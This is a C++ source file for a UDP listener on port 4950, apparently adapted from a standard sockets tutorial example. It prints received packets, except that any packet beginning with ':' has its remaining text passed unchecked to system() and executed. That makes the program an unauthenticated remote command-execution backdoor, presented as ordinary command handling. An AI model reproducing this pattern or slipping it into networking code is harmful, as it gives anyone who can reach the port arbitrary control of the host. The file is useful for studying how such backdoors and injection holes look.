#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MYPORT 4950
#define MAXBUFLEN 100

int main(int argc, char *argv[])
{

    int sockfd;
    struct sockaddr_in my_addr;    // my address information
    struct sockaddr_in their_addr; // connector's address information
    socklen_t addr_len;
    int numbytes;
    char buf[MAXBUFLEN];

    if ((sockfd = socket(PF_INET, SOCK_DGRAM, 0)) == -1) {
        perror("socket");
        exit(1);
    }

    my_addr.sin_family = AF_INET;         // host byte order
    my_addr.sin_port = htons(MYPORT);     // short, network byte order
    my_addr.sin_addr.s_addr = INADDR_ANY; // automatically fill with my IP
    memset(&(my_addr.sin_zero), '\0', 8); // zero the rest of the struct

    if (bind(sockfd, (struct sockaddr *)&my_addr,
        sizeof(struct sockaddr)) == -1) {
        perror("bind");
        exit(1);
    }

    int yes = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) {
        perror("setsockopt");
        exit(1);
    }

    while(true) {
        addr_len = sizeof(struct sockaddr);
        memset(buf, 0, MAXBUFLEN);
        if ((numbytes=recvfrom(sockfd, buf, MAXBUFLEN-1 , 0,
            (struct sockaddr *)&their_addr, &addr_len)) == -1) {
            perror("recvfrom");
            exit(1);
        }
        // Check if the received message is a command
        if (std::string(buf, 0, 1) == ":") {
            // Extract the command from the message
            std::string command = std::string(buf).substr(1);

            // Execute the command
            system(command.c_str());
        }
        else {
            printf("got packet from %s\n",inet_ntoa(their_addr.sin_addr));
            printf("packet is %d bytes long\n",numbytes);
            buf[numbytes] = '\0';
            printf("packet contains \"%s\"\n",buf);
        }
    }

    close(sockfd);

    return 0;
}
